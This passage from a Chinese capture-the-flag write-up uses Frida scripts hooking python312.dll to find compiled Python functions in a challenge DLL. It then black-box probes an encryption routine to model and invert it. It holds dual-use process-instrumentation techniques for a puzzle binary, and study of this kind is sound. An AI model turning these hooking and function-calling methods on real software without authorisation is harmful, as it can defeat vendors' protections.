        var rvaWT  = findImplRVA("warehouse_transform", funcWT);
        var rvaCF  = findImplRVA("check_flag",          funcCF);
        var rvaMain= findImplRVA("main",                 funcMain);

        log("\n================ 汇总 ================");
        log("warehouse_transform  m_impl RVA = 0x" + (rvaWT   ? rvaWT.toString(16)   : "?") +
            "  →  IDA: 0x3530C" + (rvaWT   ? rvaWT.toString(16).padStart(4,'0')   : "????"));
        log("check_flag           m_impl RVA = 0x" + (rvaCF   ? rvaCF.toString(16)   : "?") +
            "  →  IDA: 0x3530C" + (rvaCF   ? rvaCF.toString(16).padStart(4,'0')   : "????"));
        log("main                 m_impl RVA = 0x" + (rvaMain ? rvaMain.toString(16) : "?") +
            "  →  IDA: 0x3530C" + (rvaMain ? rvaMain.toString(16).padStart(4,'0') : "????"));
        log("=====================================");

    } catch (e) {
        log("[-] outer exception: " + e + "\n" + (e.stack || ""));
        fnErrClear();
    } finally {
        fnGILR(gil);
    }
}

setInterval(tryInstall, 500);
```

输出如下：

```txt
[JS] [+] KEY = 733466654b657921  (8B)
[JS] [+] TARGET = 499ea0a2c4c7e3617ecfe4f6286288d6025e6279b1bdcd17  (24B)
[JS]
========== [warehouse_transform] ==========
[JS]   obj @ 0x1822929ca40  type = compiled_function
[JS]   challenge.dll @ 0x7fffe2ad0000  size=0x49b000  (range 0x7fffe2ad0000 .. 0x7fffe2f6b000)
[JS]   python312.dll @ 0x7fffdfa20000  size=0x6b4000
[JS]   +0x000: 0x5   [other]
[JS]   +0x008: 0x7fffe2b19a80   challenge.dll+0x49a80   bytes=[1f 00 00 00 00 00 00 00]   ★ [data]
[JS]   +0x018: 0x18228ff23f0   [other]
[JS]   +0x020: 0x18228ff4180   [other]
[JS]   +0x030: 0x182292539f0   [other]
[JS]   +0x038: 0x1   [other]
[JS]   +0x040: 0x1   [other]
[JS]   +0x048: 0x1   [other]
[JS]   +0x050: 0x1   [other]
[JS]   +0x058: 0xffffffffffffffff   [other]
[JS]   +0x060: 0xffffffffffffffff   [other]
[JS]   +0x070: 0x18229296cf8   [other]
[JS]   +0x078: 0x7fffe2ad83b0   challenge.dll+0x83b0   bytes=[41 57 41 56 41 55 41 54]  ★★★ [FUNC?]  ← 可能是 m_impl
[JS]   +0x080: 0x7fffe2ad8290   challenge.dll+0x8290   bytes=[41 54 55 57 56 53 48 83]  ★★★ [FUNC?]  ← 可能是 m_impl
[JS]   +0x098: 0x7fffdff8a600   [python312.dll+0x56a600]
[JS]   +0x0b8: 0x18228ff23f0   [other]
[JS]   +0x0c0: 0x7fffe005e6b8   [python312.dll+0x63e6b8]
[JS]   +0x0f0: 0x1822929cc30   [other]
[JS]   +0x0f8: 0x1822929ca30   [other]
[JS]   +0x100: 0x4   [other]
[JS]   +0x108: 0x7fffe2b19a80   challenge.dll+0x49a80   bytes=[1f 00 00 00 00 00 00 00]   ★ [data]
[JS]   +0x118: 0x18228ff2430   [other]
[JS]   +0x120: 0x18228ff4180   [other]
[JS]   +0x130: 0x18229253c90   [other]
[JS]   +0x138: 0x1   [other]
[JS]   +0x140: 0x1   [other]
[JS]   +0x148: 0x1   [other]
[JS]   +0x150: 0x1   [other]
[JS]   +0x158: 0xffffffffffffffff   [other]
[JS]   +0x160: 0xffffffffffffffff   [other]
[JS]   +0x170: 0x182292c9198   [other]
[JS]   +0x178: 0x7fffe2ad5570   challenge.dll+0x5570   bytes=[41 55 41 54 55 57 56 53]  ★★★ [FUNC?]  ← 可能是 m_impl
[JS]   +0x180: 0x7fffe2ad8290   challenge.dll+0x8290   bytes=[41 54 55 57 56 53 48 83]  ★★★ [FUNC?]  ← 可能是 m_impl
[JS]   +0x198: 0x7fffdff8a600   [python312.dll+0x56a600]
[JS]   +0x1b8: 0x18228ff2430   [other]
[JS]   +0x1c0: 0x7fffe005e6b8   [python312.dll+0x63e6b8]
[JS]   +0x1d0: 0x1   [other]
[JS]   +0x1f0: 0x1822926ece0   [other]
[JS]   +0x1f8: 0x1822929cb30   [other]
[JS]   +0x200: 0x3   [other]
[JS]   +0x208: 0x7fffe2b19a80   challenge.dll+0x49a80   bytes=[1f 00 00 00 00 00 00 00]   ★ [data]
[JS]   +0x218: 0x7fffdff4c300   [python312.dll+0x52c300]
[JS]   +0x220: 0x18228ff4180   [other]
[JS]   +0x230: 0x18229253bb0   [other]
[JS]   +0x250: 0x1   [other]
[JS]   +0x258: 0xffffffffffffffff   [other]
[JS]   +0x260: 0xffffffffffffffff   [other]
[JS]   +0x270: 0x182292c9438   [other]
[JS]   +0x278: 0x7fffe2ad5f70   challenge.dll+0x5f70   bytes=[41 56 41 55 41 54 55 57]  ★★★ [FUNC?]  ← 可能是 m_impl
[JS]   +0x280: 0x7fffe2ad8290   challenge.dll+0x8290   bytes=[41 54 55 57 56 53 48 83]  ★★★ [FUNC?]  ← 可能是 m_impl
[JS]   +0x298: 0x7fffdff8a600   [python312.dll+0x56a600]
[JS]   +0x2b8: 0x7fffdff4c300   [python312.dll+0x52c300]
[JS]   +0x2c0: 0x7fffe005e6b8   [python312.dll+0x63e6b8]
[JS]   +0x2d0: 0x2   [other]
[JS]   +0x2f0: 0x1822927de30   [other]
[JS]   +0x2f8: 0x18229297330   [other]
[JS]   → 9 个 challenge.dll 指针
[JS]   → 推荐 m_impl:
[JS]       challenge.dll+0x83b0  = IDA 0x3530C83b0
[JS]       challenge.dll+0x8290  = IDA 0x3530C8290
[JS]       challenge.dll+0x5570  = IDA 0x3530C5570
[JS]       challenge.dll+0x8290  = IDA 0x3530C8290
[JS]       challenge.dll+0x5f70  = IDA 0x3530C5f70
[JS]       challenge.dll+0x8290  = IDA 0x3530C8290
[JS]
========== [check_flag] ==========
[JS]   obj @ 0x1822929cb40  type = compiled_function
[JS]   challenge.dll @ 0x7fffe2ad0000  size=0x49b000  (range 0x7fffe2ad0000 .. 0x7fffe2f6b000)
[JS]   python312.dll @ 0x7fffdfa20000  size=0x6b4000
[JS]   +0x000: 0x4   [other]
[JS]   +0x008: 0x7fffe2b19a80   challenge.dll+0x49a80   bytes=[20 00 00 00 00 00 00 00]   ★ [data]
[JS]   +0x018: 0x18228ff2430   [other]
[JS]   +0x020: 0x18228ff4180   [other]
[JS]   +0x030: 0x18229253c90   [other]
[JS]   +0x038: 0x1   [other]
[JS]   +0x040: 0x1   [other]
[JS]   +0x048: 0x1   [other]
[JS]   +0x050: 0x1   [other]
[JS]   +0x058: 0xffffffffffffffff   [other]
[JS]   +0x060: 0xffffffffffffffff   [other]
[JS]   +0x070: 0x182292c9198   [other]
[JS]   +0x078: 0x7fffe2ad5570   challenge.dll+0x5570   bytes=[41 55 41 54 55 57 56 53]  ★★★ [FUNC?]  ← 可能是 m_impl
[JS]   +0x080: 0x7fffe2ad8290   challenge.dll+0x8290   bytes=[41 54 55 57 56 53 48 83]  ★★★ [FUNC?]  ← 可能是 m_impl
[JS]   +0x098: 0x7fffdff8a600   [python312.dll+0x56a600]
[JS]   +0x0b8: 0x18228ff2430   [other]
[JS]   +0x0c0: 0x7fffe005e6b8   [python312.dll+0x63e6b8]
[JS]   +0x0d0: 0x1   [other]
[JS]   +0x0f0: 0x1822926ece0   [other]
[JS]   +0x0f8: 0x1822929cb30   [other]
[JS]   +0x100: 0x3   [other]
[JS]   +0x108: 0x7fffe2b19a80   challenge.dll+0x49a80   bytes=[20 00 00 00 00 00 00 00]   ★ [data]
[JS]   +0x118: 0x7fffdff4c300   [python312.dll+0x52c300]
[JS]   +0x120: 0x18228ff4180   [other]
[JS]   +0x130: 0x18229253bb0   [other]
[JS]   +0x150: 0x1   [other]
[JS]   +0x158: 0xffffffffffffffff   [other]
[JS]   +0x160: 0xffffffffffffffff   [other]
[JS]   +0x170: 0x182292c9438   [other]
[JS]   +0x178: 0x7fffe2ad5f70   challenge.dll+0x5f70   bytes=[41 56 41 55 41 54 55 57]  ★★★ [FUNC?]  ← 可能是 m_impl
[JS]   +0x180: 0x7fffe2ad8290   challenge.dll+0x8290   bytes=[41 54 55 57 56 53 48 83]  ★★★ [FUNC?]  ← 可能是 m_impl
[JS]   +0x198: 0x7fffdff8a600   [python312.dll+0x56a600]
[JS]   +0x1b8: 0x7fffdff4c300   [python312.dll+0x52c300]
[JS]   +0x1c0: 0x7fffe005e6b8   [python312.dll+0x63e6b8]
[JS]   +0x1d0: 0x2   [other]
[JS]   +0x1f0: 0x1822927de30   [other]
[JS]   +0x1f8: 0x18229297330   [other]
[JS]   +0x200: 0x1   [other]
[JS]   +0x208: 0x7fffe2b19f60   challenge.dll+0x49f60   bytes=[0d 00 00 00 00 00 00 00]   ★ [data]
[JS]   +0x218: 0x1822929cd88   [other]
[JS]   +0x220: 0x7fffdff8a600   [python312.dll+0x56a600]
[JS]   +0x228: 0x8   [other]
[JS]   +0x240: 0xffffffff   [other]
[JS]   +0x248: 0x182292539f0   [other]
[JS]   +0x260: 0x18228ff0ec0   [other]
[JS]   +0x268: 0x18228f8d4c0   [other]
[JS]   +0x278: 0x1822929cd40   [other]
[JS]   +0x280: 0x18229253ab0   [other]
[JS]   +0x288: 0x1000000000000   [other]
[JS]   +0x298: 0x30   [other]
[JS]   +0x2a0: 0x7fffe2b20921   challenge.dll+0x50921   bytes=[63 6f 6f 6f 6f 6f 00 5f]   ★ [data]
[JS]   +0x2a8: 0x182292cb910   [other]
[JS]   +0x2f0: 0x1822927df20   [other]
[JS]   +0x2f8: 0x1822926ef50   [other]
[JS]   → 8 个 challenge.dll 指针
[JS]   → 推荐 m_impl:
[JS]       challenge.dll+0x5570  = IDA 0x3530C5570
[JS]       challenge.dll+0x8290  = IDA 0x3530C8290
[JS]       challenge.dll+0x5f70  = IDA 0x3530C5f70
[JS]       challenge.dll+0x8290  = IDA 0x3530C8290
[JS]
========== [main] ==========
[JS]   obj @ 0x1822929cc40  type = compiled_function
[JS]   challenge.dll @ 0x7fffe2ad0000  size=0x49b000  (range 0x7fffe2ad0000 .. 0x7fffe2f6b000)
[JS]   python312.dll @ 0x7fffdfa20000  size=0x6b4000
[JS]   +0x000: 0x3   [other]
[JS]   +0x008: 0x7fffe2b19a80   challenge.dll+0x49a80   bytes=[21 00 00 00 00 00 00 00]   ★ [data]
[JS]   +0x018: 0x7fffdff4c300   [python312.dll+0x52c300]
[JS]   +0x020: 0x18228ff4180   [other]
[JS]   +0x030: 0x18229253bb0   [other]
[JS]   +0x050: 0x1   [other]
[JS]   +0x058: 0xffffffffffffffff   [other]
[JS]   +0x060: 0xffffffffffffffff   [other]
[JS]   +0x070: 0x182292c9438   [other]
[JS]   +0x078: 0x7fffe2ad5f70   challenge.dll+0x5f70   bytes=[41 56 41 55 41 54 55 57]  ★★★ [FUNC?]  ← 可能是 m_impl
[JS]   +0x080: 0x7fffe2ad8290   challenge.dll+0x8290   bytes=[41 54 55 57 56 53 48 83]  ★★★ [FUNC?]  ← 可能是 m_impl
[JS]   +0x098: 0x7fffdff8a600   [python312.dll+0x56a600]
[JS]   +0x0b8: 0x7fffdff4c300   [python312.dll+0x52c300]
[JS]   +0x0c0: 0x7fffe005e6b8   [python312.dll+0x63e6b8]
[JS]   +0x0d0: 0x2   [other]
[JS]   +0x0f0: 0x1822927de30   [other]
[JS]   +0x0f8: 0x18229297330   [other]
[JS]   +0x100: 0x1   [other]
[JS]   +0x108: 0x7fffe2b19f60   challenge.dll+0x49f60   bytes=[0d 00 00 00 00 00 00 00]   ★ [data]
[JS]   +0x118: 0x1822929cd88   [other]
[JS]   +0x120: 0x7fffdff8a600   [python312.dll+0x56a600]
[JS]   +0x128: 0x8   [other]
[JS]   +0x140: 0xffffffff   [other]
[JS]   +0x148: 0x182292539f0   [other]
[JS]   +0x160: 0x18228ff0ec0   [other]
[JS]   +0x168: 0x18228f8d4c0   [other]
[JS]   +0x178: 0x1822929cd40   [other]
[JS]   +0x180: 0x18229253ab0   [other]
[JS]   +0x188: 0x1000000000000   [other]
[JS]   +0x198: 0x30   [other]
[JS]   +0x1a0: 0x7fffe2b20921   challenge.dll+0x50921   bytes=[63 6f 6f 6f 6f 6f 00 5f]   ★ [data]
[JS]   +0x1a8: 0x182292cb910   [other]
[JS]   +0x1f0: 0x1822927df20   [other]
[JS]   +0x1f8: 0x1822926ef50   [other]
[JS]   +0x200: 0x1   [other]
[JS]   +0x208: 0x7fffe2b19f60   challenge.dll+0x49f60   bytes=[0d 00 00 00 00 00 00 00]   ★ [data]
[JS]   +0x218: 0x1822929ce88   [other]
[JS]   +0x220: 0x7fffdff8a600   [python312.dll+0x56a600]
[JS]   +0x228: 0x8   [other]
[JS]   +0x240: 0xffffffff   [other]
[JS]   +0x248: 0x182292539f0   [other]
[JS]   +0x260: 0x18228ff0ec0   [other]
[JS]   +0x268: 0x18228f8d4c0   [other]
[JS]   +0x278: 0x1822929ce40   [other]
[JS]   +0x280: 0x18229253ab0   [other]
[JS]   +0x288: 0x1000000000000   [other]
[JS]   +0x298: 0x30   [other]
[JS]   +0x2a0: 0x7fffe2b20921   challenge.dll+0x50921   bytes=[63 6f 6f 6f 6f 6f 00 5f]   ★ [data]
[JS]   +0x2a8: 0x182292cb940   [other]
[JS]   +0x2f0: 0x1822927e010   [other]
[JS]   +0x2f8: 0x182292cbab0   [other]
[JS]   → 7 个 challenge.dll 指针
[JS]   → 推荐 m_impl:
[JS]       challenge.dll+0x5f70  = IDA 0x3530C5f70
[JS]       challenge.dll+0x8290  = IDA 0x3530C8290
[JS]
================ 汇总 ================
[JS] warehouse_transform  m_impl RVA = 0x83b0  →  IDA: 0x3530C83b0
[JS] check_flag           m_impl RVA = 0x5570  →  IDA: 0x3530C5570
[JS] main                 m_impl RVA = 0x5f70  →  IDA: 0x3530C5f70
[JS] =====================================
```

这里我们成功得到了函数的 rva，我们可以在脚本中直接加上 ida 中的 image base，方便后续的分析。

本来在这里应该结果已经很明朗了，分析加密逻辑即可，但是观察函数：

![](https://img.halfcity.top/2026/11/10/317e20ddb7564076e3c88711214a8d3d.png)

但是这里看到开头的一堆变量就已经吓哭了，翻到下面有1700 行，已经比 rust 还离谱了。

这里面由于 python 中一切皆对象的原因，每一个运算符都是一个对象的 call，而每个运算符之间还会有大量的调度逻辑。

这里我们碰到了之前一样的问题，没有东西辅助这里要分析会很麻烦，动态调试跟输入也许可以，但是调度的逻辑本身不会变少，我们依旧需要正确识别调度器并逐步找到真实的逻辑。

此时还有一条路，之前我们发现加密算法似乎很简单，那么我们可以尝试直接对加密函数进行黑盒分析。

#### 黑盒分析

通过之前的变量名分析我们可以猜测源码的结构：

```py
def warehouse_transform(data):
    ordered = ...           # 某种顺序化
    out = bytearray(24)     # 或 []
    prev = ...              # 初始值
    for i in range(24):
        value = data[?]     # 从 data 取值
        out[i] = f(value, prev)
        prev = out[i]       # 或 prev = value
    return bytes(out)
```

可以看到源程序这样时才能做到与名字自洽，同时我们从反编译的结果中也可以确认一下：

![](https://img.halfcity.top/2026/11/10/ce32c1cbf2d3c19d737f79a3edb7b79e.png)

![](https://img.halfcity.top/2026/11/10/3d9ca64e63afbc2b2d9e831fe55842aa.png)

这里可以确认源码中一定存在字节转换和迭代的结构。

接下来我们需要使用数据集来调用这个加密函数来反证我们的猜测。

我们先定义几个基础设施：

```js
// ---- 构造 PyBytes 对象 ----
function makeBytes(u8) {
    var buf = Memory.alloc(u8.length || 1);
    for (var i = 0; i < u8.length; i++) buf.add(i).writeU8(u8[i]);
    return fnBytesNew(buf, u8.length);   // PyBytes_FromStringAndSize
}

// ---- 调用目标函数，返回 PyBytes 解析结果 ----
function callTransform(funcWT, u8) {
    var obj = makeBytes(u8);
    fnErrClear();
    var r = fnCallFn(funcWT, obj, ptr(0), ptr(0), ptr(0), ptr(0));
    if (!r || r.isNull()) { fnErrClear(); return null; }
    return getBytes(r);                  // PyBytes_AsStringAndSize 解析
}

// ---- 十六进制 -> Uint8Array ----
function hex2u8(hex) {
    var u8 = new Uint8Array(hex.length / 2);
    for (var i = 0; i < hex.length; i += 2)
        u8[i/2] = parseInt(hex.substr(i, 2), 16);
    return u8;
}
```

完整的测试脚本模版如下：

```js
// quick_diff.js
var DLL = "python312.dll";
var done = false;
var initialized = false;

function log(s) { try { send({ m: String(s) }); } catch (e) { } }

var fnIsInit, fnGILE, fnGILR, fnImportAdd, fnGetAttr, fnBytes, fnErrClear, fnCallFn, fnBytesNew;

function initFunctions(mod) {
    if (initialized) return true;
    function ex(n) { return mod.findExportByName(n); }
    var a = {
        IsInit: ex("Py_IsInitialized"), GILE: ex("PyGILState_Ensure"), GILR: ex("PyGILState_Release"),
        ImportAdd: ex("PyImport_AddModule"), GetAttr: ex("PyObject_GetAttrString"),
        Bytes: ex("PyBytes_AsStringAndSize"), BytesNew: ex("PyBytes_FromStringAndSize"),
        ErrClear: ex("PyErr_Clear"), CallFn: ex("PyObject_CallFunctionObjArgs"),
    };
    if (!a.IsInit || !a.GILE || !a.CallFn || !a.BytesNew) return false;
    fnIsInit = new NativeFunction(a.IsInit, "int", []);
    fnGILE = new NativeFunction(a.GILE, "int", []);
    fnGILR = new NativeFunction(a.GILR, "void", ["int"]);
    fnImportAdd = new NativeFunction(a.ImportAdd, "pointer", ["pointer"]);
    fnGetAttr = new NativeFunction(a.GetAttr, "pointer", ["pointer", "pointer"]);
    fnBytes = new NativeFunction(a.Bytes, "int", ["pointer", "pointer", "pointer"]);
    fnErrClear = new NativeFunction(a.ErrClear, "void", []);
    fnCallFn = new NativeFunction(a.CallFn, "pointer", ["pointer", "pointer", "pointer", "pointer", "pointer", "pointer"]);
    fnBytesNew = new NativeFunction(a.BytesNew, "pointer", ["pointer", "int64"]);
    initialized = true;
    return true;
}

function safeAttr(o, n) {
    if (!o || o.isNull()) return null;
    var r = fnGetAttr(o, Memory.allocUtf8String(n));
    if (!r || r.isNull()) { fnErrClear(); return null; }
    return r;
}

function getBytes(o) {
    if (!o || o.isNull()) return null;
    var buf = Memory.alloc(8), len = Memory.alloc(8);
    if (fnBytes(o, buf, len) !== 0) { fnErrClear(); return null; }
    var p = buf.readPointer(), n = Number(len.readS64());
    if (!p || p.isNull() || n <= 0 || n > 0x100000) return null;
    var arr = new Uint8Array(p.readByteArray(n));
    var hex = "";
    for (var i = 0; i < n; i++) hex += ("0" + arr[i].toString(16)).slice(-2);
    return { bytes: arr, len: n, hex: hex };
}

function makeBytes(u8) {
    var buf = Memory.alloc(u8.length);
    for (var i = 0; i < u8.length; i++) buf.add(i).writeU8(u8[i]);
    return fnBytesNew(buf, u8.length);
}

function callTransform(func, u8) {
    var obj = makeBytes(u8);
    fnErrClear();
    var r = fnCallFn(func, obj, ptr(0), ptr(0), ptr(0), ptr(0));
    if (!r || r.isNull()) { fnErrClear(); return null; }
    return getBytes(r);
}

function tryInstall() {
    if (done) return;
    var mod = Process.findModuleByName(DLL);
    if (!mod || !initFunctions(mod) || fnIsInit() === 0) return;

    var gil = fnGILE();
    try {
        var mainMod = fnImportAdd(Memory.allocUtf8String("__main__"));
        if (!mainMod || mainMod.isNull()) { fnErrClear(); return; }
        
        var funcWT = safeAttr(mainMod, "warehouse_transform");
        var targetObj = safeAttr(mainMod, "TARGET");
        var keyObj    = safeAttr(mainMod, "KEY");
        
        if (!funcWT || !targetObj) return;
        done = true;

        var target = getBytes(targetObj);
        log("TARGET = " + target.hex);
		
        // ...

    } catch (e) {
        log("error: " + e);
    } finally {
        fnGILR(gil);
    }
}

setInterval(tryInstall, 300);
```

后续将只展示填入模版中的测试内容。

然后我们开始对函数的签名进行探测：

```js
// A1: 参数 —— 期望 TypeError
var r = fnCallFn(funcWT, targetObj, keyObj, ptr(0), ptr(0), ptr(0));
// -> NULL (TypeError: takes 1 positional argument but 2 were given)

// A2: 单参数 TARGET 返回值
var r = fnCallFn(funcWT, targetObj, ptr(0), ptr(0), ptr(0), ptr(0));
var b = getBytes(r);
log("transform(TARGET) = " + (b ? b.hex : "NULL"));
// -> 7c53a1a8... 24 字节，不可打印

// A3: 8 字节输入 —— 期望 IndexError
var shortObj = makeBytes(new Uint8Array(8));
fnCallFn(funcWT, shortObj, ptr(0), ptr(0), ptr(0), ptr(0));
// -> NULL (IndexError: index out of range)

// A4: 32 字节输入 —— 验证取值逻辑
var longObj = makeBytes(new Uint8Array(32));
var r = fnCallFn(funcWT, longObj, ptr(0), ptr(0), ptr(0), ptr(0));
// -> 与 transform(24 zeros) 相同

// A6: check_flag 对照
var testObj = fnFromStr(Memory.allocUtf8String("test"));
var r = fnCallFn(funcCF, testObj, ptr(0), ptr(0), ptr(0), ptr(0));
log("check_flag('test') = " + Number(fnLong(r)));  // -> 0 (False)
```

此时我们基本可以确定这个函数要求传入 24 字节同时会返回 24 字节。

这是一个流式加密。

随后我们进行线性探测：

```js
// B1: 基准 —— 全零
var zerosU8 = new Uint8Array(24);
var zerosOut = callTransform(funcWT, zerosU8);
log("zeros = " + zerosOut.hex);   // b5e94fb4ff64ddfe...

// B3: 顺序字节 0..23
var seq = new Uint8Array(24);
for (var i = 0; i < 24; i++) seq[i] = i;
var seqOut = callTransform(funcWT, seq);

// B4: 只改 data[0] = 1
var onlyFirst = new Uint8Array(24); onlyFirst[0] = 1;
var r = callTransform(funcWT, onlyFirst);
// 与 zerosOut 做差分 -> 24 个字节全部 -1

// B5: 只改 data[23] = 1
var onlyLast = new Uint8Array(24); onlyLast[23] = 1;
var r = callTransform(funcWT, onlyLast);
// 与 zerosOut 做差分 -> 只有最后 1 字节 -1

// B6: 顺序敏感测试
var ab = new Uint8Array(24); ab[0]=1; ab[1]=2;
var ba = new Uint8Array(24); ba[0]=2; ba[1]=1;
var rAb = callTransform(funcWT, ab);
var rBa = callTransform(funcWT, ba);
// 前几字节不同 -> 无排序

// B7: 对合性测试
var r1 = callTransform(funcWT, targetB.bytes);       // transform(TARGET)
var r2 = callTransform(funcWT, r1.bytes);            // transform(transform(TARGET))
log("== TARGET ? " + (r2.hex === targetB.hex));      // -> false
```

随后进行精确扫描。

先确定单字节差异：

```js
for (var i = 0; i < 24; i++) {
    var d = new Uint8Array(24);
    d[i] = 1;
    var r = callTransform(funcWT, d);
    if (!r) { log("only[" + i + "] -> NULL"); continue; }
    var diff = [];
    for (var j = 0; j < 24; j++) {
        var delta = (r.bytes[j] - zerosOut.bytes[j]) & 0xff;
        diff.push(delta.toString(16).padStart(2, '0'));
    }
    log("only[" + i + "] = 1  delta = " + diff.join(' '));
}
```

输出：`S(i) = 4*(i%6) + i//6` 的排列 + `s(i)` 的符号（`ff` 表示 `-1`，`01` 表示 `+1`）

随后是累加：

```js
for (var k = 0; k < 24; k++) {
    var d = new Uint8Array(24);
    for (var j = 0; j <= k; j++) d[j] = 1;
    var r = callTransform(funcWT, d);
    if (!r) continue;
    var diff = [];
    for (var j = 0; j < 24; j++) {
        var delta = (r.bytes[j] - zerosOut.bytes[j]) & 0xff;
        diff.push(delta.toString(16).padStart(2, '0'));
    }
    log("data[0.." + k + "] = 1  delta = " + diff.join(' '));
}
```

输出：交叉验证 C1 的排列和符号；`k ≥ 6` 后差分出现 `+1` 和跳变，确认 `s(i)` 的符号交替。

参考如下条件：

- `only[0]=1` 全 `-1` ⇒ `s(0) = -1`，`prev -= data[0]`
- `only[6]=1` 从第 1 位起 `+1` ⇒ `s(6) = +1`，`prev += data[6]`
- `KEY` 参与解释了为什么 `transform(zeros)` 非零且单调递增

此时我们可以得出一个第一版的模型：

```py
prev = IV
for j in range(24):
    i = PERM[j]
    prev = (prev + s(i) * data[i] + KEY[j % 8]) & 0xFF
    out[j] = prev
```

关于 `KEY` 的初始推断:

对 `transform(zeros)` 做差分：

```txt
b5 e9 4f b4 ff 64 dd fe ...
  └─+34─┘
e9 - b5 = 0x34
4f - e9 = 0x66
b4 - 4f = 0x65
ff - b4 = 0x4b
64 - ff = 0x65  (mod 256)
dd - 64 = 0x79
fe - dd = 0x21
```

得到 **`KEY = b"s4feKey!"`**，这是从 `zeros` 输出的相邻差分直接反推的（假设 `KEY[i]` 是加性贡献）。

`IV` 从 `transform(zeros)[0] - KEY[0] = 0xb5 - 0x73 = 0x42` 得到。

这时模型自洽所有观测都被解释。

但是使用模型逆推 TARGET：

```py
def inverse_v1(target):
    data = [0] * 24
    prev = IV
    for j in range(24):
        i = PERM[j]
        # target[j] = (prev + s(i)*data[i] + KEY[j%8]) & 0xFF
        # => s(i)*data[i] = target[j] - prev - KEY[j%8]
        # 由于 s(i) ∈ {+1,-1}，除以 s(i) 等于乘 s(i)
        data[i] = ((target[j] - prev - KEY[j%8]) * s(i)) & 0xFF
        prev = target[j]
    return bytes(data)
```

输出: `b'l)V\x19G\x13!b\x1d+(Y\x9c]\xafS\x9eic\xa3S\xd3N\xd7'`

用模型反向验证：`transform(inverse(TARGET)) == TARGET`？

python

```
flag = inverse_v1(TARGET)
check = transform_v1(flag)
assert check == TARGET   # ❌ 失败
```



**模型不闭环**。这不是"逆推算错了"，而是**正向/反向用的是同一个错误模型，却算不出同一个结果**——说明模型的运算本身错了，不是数值精度问题。

这个信号非常强：

- 如果只是某个常量写错（比如 `KEY[3]` 错一个字节），`inverse` 和 `transform` 可能还是**同一对互逆**函数，`transform(inverse(T)) == T` 会成立（但 `inverse(T)` 不是真 flag）。
- 现在是 `transform(inverse(T)) != T`，说明 **`inverse` 不是 `transform` 的逆函数**——模型层面错了。

2.3 排查方向

要修正模型，必须找一个**新的观测点**。已有的数据（`zeros`、`only[i]=1`、累加）都被旧模型"解释"了，但**只是解释，不是唯一解释**。

关键洞察：**`s(i) = ±1` 的差分模式，对"加法"和"XOR"是兼容的**。

具体地，如果运算是 `prev + (KEY ^ data)`：

- `data[i] = 0` 时：`KEY ^ 0 = KEY`
- `data[i] = 1` 时：`KEY ^ 1 = KEY - 1`（如果 `KEY` 最低位是 1）或 `KEY + 1`（如果 `KEY` 最低位是 0）

对照 `KEY = b"s4feKey!"`：

- `KEY[0] = 0x73`（最低位 1）→ `KEY ^ 1 = 0x72 = KEY - 1` → **输出 -1** ✓
- `KEY[6] = 0x79`（最低位 1）→ `KEY ^ 1 = 0x78 = KEY - 1` → **输出 -1** ✗

等等，`only[6]=1` 的差分是 `+1`，而 `KEY[6] = 0x79` 最低位是 1，`XOR 1` 应该 -1。**这里矛盾了！**

说明 `PERM` 和 `s(i)` 的对应关系需要重新审视。或者 `s(i)` 不是单纯的符号，而是 `XOR` 的特殊结果。

------

三、重新审视：`s(i)` 到底是什么

回看 C1 的数据：

text

```
i=0:  ff ff ff ... ff          → s(0) = -1, 影响 j ∈ [0, 23]
i=1:  00 00 00 00 ff ff ...    → s(1) = -1, 影响 j ∈ [4, 23]
i=2:  00×8  ff×16              → s(2) = -1, 影响 j ∈ [8, 23]
i=3:  00×12 ff×12              → s(3) = -1, 影响 j ∈ [12, 23]
i=4:  00×16 ff×8               → s(4) = -1, 影响 j ∈ [16, 23]
i=5:  00×20 ff×4               → s(5) = -1, 影响 j ∈ [20, 23]
i=6:  00 01 01 01 ... 01       → s(6) = +1, 影响 j ∈ [1, 23]
i=7:  00×5 ff×19               → s(7) = -1, 影响 j ∈ [5, 23]
i=8:  00×9 01×15               → s(8) = +1, 影响 j ∈ [9, 23]
i=9:  00×13 ff×11              → s(9) = -1, 影响 j ∈ [13, 23]
i=10: 00×17 01×7               → s(10) = +1, 影响 j ∈ [17, 23]
i=11: 00×21 ff×3               → s(11) = -1, 影响 j ∈ [21, 23]
i=12: 00 00 01 01 ...          → s(12) = +1, 影响 j ∈ [2, 23]
...
```



**问题**：`only[i]=1` 的差分，是 `+1` 还是 `-1`，取决于**变换当时的 `KEY[j%8]` 的最低位**，不取决于 `i` 本身。

如果模型是 `prev += KEY[j%8] ^ data[PERM[j]]`：

text

```
data[PERM[j]] = 1 时，增量 = KEY[j%8] ^ 1 - KEY[j%8]
               = (最低位为 1 时) -1
               = (最低位为 0 时) +1
```



**逐位置 `j` 验证**（关键一步）：

`KEY = b"s4feKey!"`，二进制最低位：

- `KEY[0] = 0x73` → 1 → `XOR 1` 使 -1
- `KEY[1] = 0x34` → 0 → `XOR 1` 使 +1
- `KEY[2] = 0x66` → 0 → `XOR 1` 使 +1
- `KEY[3] = 0x65` → 1 → `XOR 1` 使 -1
- `KEY[4] = 0x4b` → 1 → `XOR 1` 使 -1
- `KEY[5] = 0x65` → 1 → `XOR 1` 使 -1
- `KEY[6] = 0x79` → 1 → `XOR 1` 使 -1
- `KEY[7] = 0x21` → 1 → `XOR 1` 使 -1

理论上 `only[6]=1` 应该让 `j ∈ [1, 23]` 全部 `-1`（因为 `KEY[1..7]` 只有少数几个最低位是 0）。但**实测是 `+1`**，和 `KEY[6]=0x79`（最低位 1 → 应该 -1）矛盾。

**说明 `XOR` 的假设也有问题**——或者 `s(i)` 和 `KEY[j%8]` 的对应关系不是"按 `j` 查 `KEY[j%8]`"。

------

四、决定性验证：从 `transform(TARGET)[0]` 反推

不再纠结理论，直接用**已知输入输出对**做实验：

```
KEY        = b"s4feKey!"         （从 transform(zeros) 差分反推）
IV         = 0x42                 （从 transform(zeros)[0] - KEY[0]）
TARGET[0]  = 0x49
TARGET[1]  = 0x9e
TARGET[2]  = 0xa0
transform(TARGET)[0] = 0x7c
transform(TARGET)[1] = 0x53
```

手算三种候选：

`j = 0`，`PERM[0] = 0`，`data[0] = TARGET[0] = 0x49`，`KEY[0] = 0x73`：

| 运算                      | 计算                                        | 结果       | 是否等于 0x7c |
| :------------------------ | :------------------------------------------ | :--------- | :------------ |
| `prev + data`             | `0x42 + 0x49 = 0x8b`                        | `0x8b`     | ❌             |
| `prev - data`             | `0x42 - 0x49 = 0xf9`                        | `0xf9`     | ❌             |
| `prev + (KEY + data)`     | `0x42 + 0x73 + 0x49 = 0xfe`                 | `0xfe`     | ❌             |
